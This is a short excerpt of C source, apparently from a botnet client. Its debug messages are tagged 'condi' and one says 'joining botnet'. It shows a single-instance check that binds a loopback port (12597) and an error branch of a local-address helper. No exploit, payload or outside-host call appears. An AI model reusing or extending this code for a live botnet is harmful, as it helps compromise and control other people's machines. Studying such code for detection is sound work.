...
ipv4_t util_local_addr(void)
{
    ...
    {
#ifdef DEBUG
        printf("(condi/util) Failed to call socket(), errno = %d\n", errno);
#endif
        return 0;
    }
...
int ensure_single_instance() {
    ...
    if (sockfd == -1) {
        #ifdef DEBUG
            printf("(condi/ensure) Error creating socket for ESI port\n");
        #endif
        exit(1);
    }
    ...
    addr.sin_family = AF_INET;
    addr.sin_port = htons(12597);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        #ifdef DEBUG
            printf("(condi/ensure) Another instance is already running\n");
        #endif
        close(sockfd);
        return 1;
    }
    ...
    #ifdef DEBUG
        printf("(condi/ensure) No other instance detected, joining botnet\n");
    #endif
    return 0;
}
